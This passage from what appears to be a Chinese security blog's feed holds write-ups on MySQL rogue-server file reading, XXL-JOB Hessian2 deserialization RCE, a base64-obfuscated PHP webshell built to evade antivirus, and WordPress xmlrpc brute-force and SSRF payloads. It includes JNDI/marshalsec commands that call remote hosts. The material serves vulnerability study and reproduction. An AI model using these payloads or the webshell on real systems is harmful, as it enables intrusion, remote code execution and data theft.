ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)</span><br><span class="line">preProcess:76, NoSubInterceptorWrapper (com.mysql.cj)</span><br><span class="line">invokeQueryInterceptorsPre:1137, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">sendQueryPacket:963, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">sendQueryString:914, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">execSQL:1150, NativeSession (com.mysql.cj)</span><br><span class="line">setAutoCommit:2064, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">handleAutoCommitDefaults:1382, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">initializePropsFromServer:1327, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connectOneTryOnly:966, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">createNewIO:825, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">&lt;init&gt;:455, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">getInstance:240, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connect:207, NonRegisteringDriver (com.mysql.cj.jdbc)</span><br><span class="line">getConnection:664, DriverManager (java.sql)</span><br><span class="line">getConnection:247, DriverManager (java.sql)</span><br><span class="line">main:10, Test</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>MySQL JDBC客户端在开始连接MySQL服务端时，会执行一些如<code>set autocommit=1</code>等SQL Query，其中会触发我们所配置的queryInterceptors中的preProcess()函数，在该函数逻辑中、当MySQL字段类型为BLOB时，会对数据进行反序列化操作，因此只要保证第1或第2字段为BLOB类型且存储了恶意序列化数据即可触发反序列化漏洞。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="MySQL" scheme="https://www.mi1k7ea.com/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL客户端任意文件读取</title>
    <link href="https://www.mi1k7ea.com/2021/04/23/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>https://www.mi1k7ea.com/2021/04/23/MySQL客户端任意文件读取/</id>
    <published>2021-04-23T04:32:46.000Z</published>
    <updated>2021-04-24T08:27:43.822Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前学习Jackson一条Gadget的时候涉及过，HW期间又发现类似的恶意利用工具和漏洞，就再补充一些细节。</p><h2 id="0x01-MySQL客户端任意文件读取"><a href="#0x01-MySQL客户端任意文件读取" class="headerlink" title="0x01 MySQL客户端任意文件读取"></a>0x01 MySQL客户端任意文件读取</h2><h3 id="LOAD-DATA-LOCAL-INFILE"><a href="#LOAD-DATA-LOCAL-INFILE" class="headerlink" title="LOAD DATA LOCAL INFILE"></a>LOAD DATA LOCAL INFILE</h3><p>具体可参考：<a href="https://dev.mysql.com/doc/mysql-security-excerpt/5.7/en/load-data-local-security.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/mysql-security-excerpt/5.7/en/load-data-local-security.html</a></p><p>MySQL支持使用LOAD DATA LOCAL INFILE语句，即可将客户端本地的文件中的数据insert到MySQL的某张表中。</p><p>注意，还有个LOAD DATA INFILE语句，这是加载服务端的文件而非客户端的。</p><p>LOAD DATA LOCAL INFILE的工作过程大致如下：</p><ol><li>用户在客户端输入：load data local file “/data.txt” into table test；</li><li>客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中；</li><li>服务端-&gt;客户端：把你本地的/data.txt文件发给我；</li><li>客户端-&gt;服务端：/data.txt文件的内容；</li></ol><p>测试看下LOAD DATA LOCAL INFILE语句，用Kali作为客户端远程连接MySQL服务，然后执行如下SQL语句来将<code>/etc/passwd</code>文件中的内容插入到MySQL的users表中：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>;</span><br></pre></td></tr></table></figure><p><img src="/2021/04/23/MySQL客户端任意文件读取/1.png" alt=""></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>上述过程存在一个问题，即客户端发送哪个文件的内容，取决于第三步即服务端响应的想要的哪个文件，如果服务端是个恶意的MySQL，那么它可以读取客户端的任意文件内容，比如读取/etc/passwd：</p><ol><li>用户在客户端输入：load data local file “/data.txt” into table test；</li><li>客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中；</li><li>服务端-&gt;客户端：把你本地的/etc/passwd文件发给我；</li><li>客户端-&gt;服务端：/etc/passwd文件的内容；</li></ol><p>而且，在大部分客户端（比如MySQL Connect/J）的实现里，第一步和第二部并非是必须的，客户端发送任意查询给服务端，服务端都可以返回文件发送的请求。而大部分客户端在建立连接之后，都会有一些查询服务器配置之类的查询，所以使用这些客户端，只要创建了到恶意MySQL服务器的连接，那么客户端所在的服务器上的所有文件都可能泄露。</p><p>注意：如果使用MySQL客户端直接连接的话，是需要添加<code>--enable-local-infile</code>选项的，而其他大部分MySQL客户端实现中，是默认开启的，比如allowLoadLocalInfile是MySQL的JDBC驱动的一个创建连接的配置项、用来控制是否允许从本地读取文件，默认值为True，具体的MySQL客户端实现得具体看。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>攻击流程如下：</p><ol><li>攻击者开启伪造的恶意MySQL服务器，诱使受害者MySQL客户端访问；</li><li>受害者向恶意MySQL服务器发起请求，并尝试进行身份认证；</li><li>恶意MySQL服务器接受到受害者的连接请求后，发送正常的问候、身份验证正确并且发送LOAD DATA LOCAL INFILE语句来读取受害者客户端本地敏感文件；</li><li>受害者的MySQL客户端认为身份验证正确，执行攻击者的发来的请求，通过LOAD DATA LOCAL INFILE语句将本地文件内容发给恶意MySQL服务器；</li><li>恶意MySQL服务器接受到客户端敏感文件，Done；</li></ol><p>GitHub上恶意MySQL服务相关项目：</p><ul><li><a href="https://github.com/rmb122/rogue_mysql_server" target="_blank" rel="noopener">https://github.com/rmb122/rogue_mysql_server</a></li><li><a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></li></ul><p>开启恶意MySQL服务后，受害者尝试使用MySQL客户端连接恶意服务端（这里metasploitable机子的MySQL版本为5.0.51a-3ubuntu5，无需添加<code>--enable-local-infile</code>选项即可成功）：</p><p><img src="/2021/04/23/MySQL客户端任意文件读取/2.png" alt=""></p><p>恶意MySQL服务端窃取到了<code>/etc/passwd</code>文件内容：</p><p><img src="/2021/04/23/MySQL客户端任意文件读取/3.png" alt=""></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>针对LOAD DATA LOCAL INFILE的安全问题，MySQL官方给出如下说明：</p><blockquote><p>为了避免连接到不受信任的服务器，客户端可以建立安全连接并通过使用<a href="https://dev.mysql.com/doc/refman/5.7/en/connection-options.html#option_general_ssl-mode" target="_blank" rel="noopener"><code>--ssl-mode=VERIFY_IDENTITY</code></a>选项和适当的CA证书进行连接来验证服务器身份 。</p><p>为避免出现<a href="https://dev.mysql.com/doc/refman/5.7/en/load-data.html" target="_blank" rel="noopener"><code>LOAD DATA</code></a>问题，客户应避免使用<code>LOCAL</code>。</p><p>管理员和应用程序可以配置是否允许本地数据加载，如下所示：</p><ul><li><p>在服务器端：</p><ul><li>所述<a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile" target="_blank" rel="noopener"><code>local_infile</code></a>系统变量控制服务器端<code>LOCAL</code> 的能力。根据 <a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile" target="_blank" rel="noopener"><code>local_infile</code></a>设置，服务器会拒绝或允许请求本地数据加载的客户端加载本地数据。</li><li>默认情况下，它<a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile" target="_blank" rel="noopener"><code>local_infile</code></a> 是禁用的。要显式地使服务器拒绝或允许<a href="https://dev.mysql.com/doc/refman/5.7/en/load-data.html" target="_blank" rel="noopener"><code>LOAD DATA LOCAL</code></a>语句（无论在构建时或运行时如何配置客户端程序和库），请在 禁用或启用的情况下启动<strong>mysqld</strong><a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile" target="_blank" rel="noopener"><code>local_infile</code></a>。<a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile" target="_blank" rel="noopener"><code>local_infile</code></a>也可以在运行时设置。</li></ul></li><li><p>在客户端：</p><ul><li><p>该<strong>CMake的</strong>选项控制编译默认的MySQL客户端库能力（见 <a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html" target="_blank" rel="noopener">MySQL源代码的配置选项</a>）。因此，未进行明确安排的客户端将 根据MySQL构建时指定的设置禁用或启用功能 。 <a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile" target="_blank" rel="noopener"><code>ENABLED_LOCAL_INFILE</code></a> <code>LOCAL`</code>LOCAL<code>[</code>ENABLED_LOCAL_INFILE`](<a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile</a>)</p></li><li><p>默认情况下，MySQL二进制发行版中的客户端库在<a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile" target="_blank" rel="noopener"><code>ENABLED_LOCAL_INFILE</code></a> 启用时进行编译 。如果从源代码编译MySQL，请<a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile" target="_blank" rel="noopener"><code>ENABLED_LOCAL_INFILE</code></a> 根据未进行显式安排的客户端应<code>LOCAL</code> 禁用还是启用功能，将其配置为禁用或启用。</p></li><li><p>对于使用C API的客户端程序，本地数据加载功能由编译到MySQL客户端库中的默认值决定。要显式启用或禁用它，请调用<a href="https://dev.mysql.com/doc/c-api/5.7/en/mysql-options.html" target="_blank" rel="noopener"><code>mysql_options()</code></a> C API函数以禁用或启用该 <code>MYSQL_OPT_LOCAL_INFILE</code>选项。参见 <a href="https://dev.mysql.com/doc/c-api/5.7/en/mysql-options.html" target="_blank" rel="noopener">mysql_options（）</a>。</p></li><li><p>对于<strong>mysql</strong>客户端，本地数据加载能力由编译到MySQL客户端库中的默认值决定。要显式禁用或启用它，请使用 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-command-options.html#option_mysql_local-infile" target="_blank" rel="noopener"><code>--local-infile=0</code></a>或 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-command-options.html#option_mysql_local-infile" target="_blank" rel="noopener"><code>--local-infile[=1\]</code></a>选项。</p></li><li><p>对于<strong>mysqlimport</strong>客户端，默认情况下不使用本地数据加载。要显式禁用或启用它，请使用 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysqlimport.html#option_mysqlimport_local" target="_blank" rel="noopener"><code>--local=0</code></a>或 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysqlimport.html#option_mysqlimport_local" target="_blank" rel="noopener"><code>--local[=1\]</code></a>选项。</p></li><li><p>如果<a href="https://dev.mysql.com/doc/refman/5.7/en/load-data.html" target="_blank" rel="noopener"><code>LOAD DATA LOCAL</code></a>在Perl脚本或其他<code>[client]</code>从选项文件中读取该组的程序中使用，则可以向该组添加 <code>local-infile</code>选项设置。为防止不理解此选项的程序出现问题，请使用<a href="https://dev.mysql.com/doc/refman/5.7/en/option-modifiers.html" target="_blank" rel="noopener"><code>loose-</code></a> 前缀指定它 ：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;     [client]</span><br><span class="line">&gt;     loose-local-infile=0</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul></blockquote><blockquote><pre><code>或者：<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;     [client]</span><br><span class="line">&gt;     loose-local-infile=1</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></code></pre></blockquote><blockquote><ul><li>在所有情况下，<code>LOCAL</code> 客户端成功使用加载操作还需要服务器允许本地加载。</li></ul><p>如果<code>LOCAL</code>禁用了此功能，则在服务器或客户端上，尝试发出<a href="https://dev.mysql.com/doc/refman/5.7/en/load-data.html" target="_blank" rel="noopener"><code>LOAD DATA LOCAL</code></a>语句的客户端都会 收到以下错误消息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; ERROR 1148: The used command is not allowed with this MySQL version</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="0x02-MySQL蜜罐"><a href="#0x02-MySQL蜜罐" class="headerlink" title="0x02 MySQL蜜罐"></a>0x02 MySQL蜜罐</h2><p>利用该漏洞可以制作MySQL蜜罐来诱使攻击者连接，从而窃取攻击者主机上的敏感信息。GitHub上已有可以读取攻击者微信ID的MySQL蜜罐，具体参见：<a href="https://github.com/qigpig/MysqlHoneypot" target="_blank" rel="noopener">https://github.com/qigpig/MysqlHoneypot</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="MySQL" scheme="https://www.mi1k7ea.com/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>XXL-JOB Hessian2反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2021/04/22/XXL-JOB-Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/</id>
    <published>2021-04-22T09:24:12.000Z</published>
    <updated>2021-04-23T04:25:47.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学习。</p><p>参考：<a href="https://xz.aliyun.com/t/8456" target="_blank" rel="noopener">xxl-job api未授权Hessian2反序列化</a></p><h2 id="0x01-XXL-JOB-Hessian2反序列化漏洞"><a href="#0x01-XXL-JOB-Hessian2反序列化漏洞" class="headerlink" title="0x01 XXL-JOB Hessian2反序列化漏洞"></a>0x01 XXL-JOB Hessian2反序列化漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>XXL-JOB &lt;= 2.0.2</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>XXL-JOB在2.0.2及以下版本中的接口存在未授权访问漏洞，该接口会进行Hessian2反序列化操作，导致存在Hessian2反序列化漏洞从而RCE。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>未授权访问API探测：<code>/xxl-job-admin/api</code></p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/1.png" alt=""></p><p>启动恶意JNDI注入利用服务（工具地址：<a href="https://github.com/welk1n/JNDI-Injection-Exploit），这里打DNSLog验证：" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit），这里打DNSLog验证：</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C <span class="string">"curl xxljob.7phxqp.dnslog.cn"</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/2.png" alt=""></p><p>利用最新版marshalsec的Hessian2这个Gadget来生成payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor rmi:<span class="comment">//x.x.x.x:1099/ic9mnr &gt; xxl.ser</span></span><br></pre></td></tr></table></figure><p>在Burp中，使用”Paste from file”选项从文件中直接复制Hessian2序列化内容到POST的body中，发送攻击报文，如下响应内容即无序列化内容的格式问题：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/3.png" alt=""></p><p>恶意RMI服务端接受到请求：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/4.png" alt=""></p><p>打到DNSLog：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/5.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞版本代码：<a href="https://github.com/xuxueli/xxl-job/releases/tag/2.0.2" target="_blank" rel="noopener">https://github.com/xuxueli/xxl-job/releases/tag/2.0.2</a></p><p>看到对应存在未授权访问漏洞的API即<code>/xxl-job-admin/api</code>，代码位于<code>com/xxl/job/admin/controller/JobApiController.java</code>，其中注解PermessionLimit中limit的值为false即并没有限制权限：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/6.png" alt=""></p><p>往下看，会对请求中读取到的字节码进行反序列化操作：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/7.png" alt=""></p><p>上述的deserialize()函数是抽象类Serializer的函数，具体的还得”Ctrl+Alt+B”查看该抽象类的具体实现类中对应的重写后的方法，这里找到有HessianSerializer的：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/8.png" alt=""></p><p>其中就是Hessian2反序列化操作了：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/9.png" alt=""></p><p>前面出现了好几个抽象类deserialize()函数的实现类，怎么会偏偏是Hessian2的呢？</p><p>看到XXL-JOB的动态调度器中查看，位于<code>com/xxl/job/admin/core/schedule/XxlJobDynamicScheduler.java</code>，这里的启动的时候即调用start()函数时会调用initRpcProvider()函数，而该函数在初始化RPC Provider时明确指定了XmlRpcProviderFactory的序列化器为Hessian2的：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/10.png" alt=""></p><p>至此，OK。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="XXL-JOB" scheme="https://www.mi1k7ea.com/tags/XXL-JOB/"/>
    
  </entry>
  
  <entry>
    <title>通过spl_autoload_register实现PHP免杀WebShell</title>
    <link href="https://www.mi1k7ea.com/2021/04/21/%E9%80%9A%E8%BF%87spl-autoload-register%E5%AE%9E%E7%8E%B0PHP%E5%85%8D%E6%9D%80WebShell/"/>
    <id>https://www.mi1k7ea.com/2021/04/21/通过spl-autoload-register实现PHP免杀WebShell/</id>
    <published>2021-04-21T14:46:25.000Z</published>
    <updated>2021-05-29T07:58:17.292Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>参考自：<a href="https://mp.weixin.qq.com/s/WiqZEApL3nVgZDv7nJ4gOw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/WiqZEApL3nVgZDv7nJ4gOw</a></p><h2 id="0x01-spl-autoload-register-函数"><a href="#0x01-spl-autoload-register-函数" class="headerlink" title="0x01 spl_autoload_register()函数"></a>0x01 spl_autoload_register()函数</h2><p>SPL是Standard PHP Library(标准PHP库)的缩写。它是PHP5引入的一个扩展库，其主要功能包括autoload机制的实现及包括各种Iterator接口或类。 SPL autoload机制的实现是通过将函数指针autoload_func指向自己实现的具有自动装载功能的函数来实现的。</p><p>spl_autoload_register()函数：注册给定的函数作为<code>__autoload</code>的实现。<strong>当尝试加载未定义的类时，就会调用SPL __autoload中注册的函数</strong>。</p><p>支持版本：PHP 5 &gt;= 5.1.0, PHP 7</p><p>函数定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload_register ( callable $autoload_function = ? , bool $throw = <span class="keyword">true</span> , bool $prepend = <span class="keyword">false</span> ) : bool</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><p>autoload_function：欲注册的自动装载函数。如果没有提供任何参数，则自动注册 autoload 的默认实现函数spl_autoload()。</p></li><li><p>throw：此参数设置了 autoload_function 无法成功注册时， spl_autoload_register()是否抛出异常。</p></li><li><p>prepend：如果是 true，spl_autoload_register() 会添加函数到队列之首，而不是队列尾部。</p></li></ul><h2 id="0x02-免杀WebShell"><a href="#0x02-免杀WebShell" class="headerlink" title="0x02 免杀WebShell"></a>0x02 免杀WebShell</h2><p>Demo代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span> <span class="params">($class_name)</span></span>&#123;</span><br><span class="line">    file_put_contents(base64_decode(<span class="string">"YWFh"</span>), base64_decode(<span class="string">'PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'aaa'</span>);</span><br><span class="line"><span class="keyword">new</span> aaa();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一次访问：</p><ol><li>先调用spl_autoload_register()函数注册一个<code>__autoload</code>的匿名函数，其中将<code>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;</code>（第二个Base64编码内容）内容写入名为aaa（第一个Base64编码内容）的文件中，注意这一步只是注册了这个匿名函数、并未执行函数中的代码逻辑；</li><li>包含aaa文件进来，但由于文件不存在因此报错；</li><li>新建一个aaa类实例，因为aaa类不存在，因此会去调用第一步中注册的匿名函数，其中将一句话木马写入了aaa文件中；</li></ol><p><img src="/2021/04/21/通过spl-autoload-register实现PHP免杀WebShell/1.png" alt=""></p><p>第二次访问，由于aaa文件已生成，成功包含该文件进而getshell（这里找不到aaa类的错误无需关注）：</p><p><img src="/2021/04/21/通过spl-autoload-register实现PHP免杀WebShell/2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
      <category term="WebShell" scheme="https://www.mi1k7ea.com/tags/WebShell/"/>
    
  </entry>
  
  <entry>
    <title>WordPress渗透测试</title>
    <link href="https://www.mi1k7ea.com/2021/04/21/WordPress%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>https://www.mi1k7ea.com/2021/04/21/WordPress渗透测试/</id>
    <published>2021-04-21T02:03:48.000Z</published>
    <updated>2021-04-21T02:45:48.851Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>个人笔记。</p><h2 id="0x01-WPScan"><a href="#0x01-WPScan" class="headerlink" title="0x01 WPScan"></a>0x01 WPScan</h2><p>Kali中自带：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ wpscan --proxy protocol://ip:port --url http://a.com/</span><br></pre></td></tr></table></figure><h2 id="0x02-xmlrpc-php"><a href="#0x02-xmlrpc-php" class="headerlink" title="0x02 xmlrpc.php"></a>0x02 xmlrpc.php</h2><h3 id="探测方法"><a href="#探测方法" class="headerlink" title="探测方法"></a>探测方法</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>system.listMethods<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="暴破账号"><a href="#暴破账号" class="headerlink" title="暴破账号"></a>暴破账号</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>password<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>前提是WP版本 &lt;= 3.5.1。如果高于该版本只能DNSLog验证，也能用于向其他机子发起DoS攻击。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>pingback.ping<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>http://127.0.0.1:80<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>http://localhost/wordpress/?p=1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果目标IP和端口存在，则响应包中的<code>&lt;value&gt;&lt;int&gt;</code>中的值大于0。</p><p>利用脚本：<a href="https://github.com/FireFart/WordpressPingbackPortScanner" target="_blank" rel="noopener">https://github.com/FireFart/WordpressPingbackPortScanner</a></p><p>除了端口扫描外，还能结合file://协议来读取本地文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 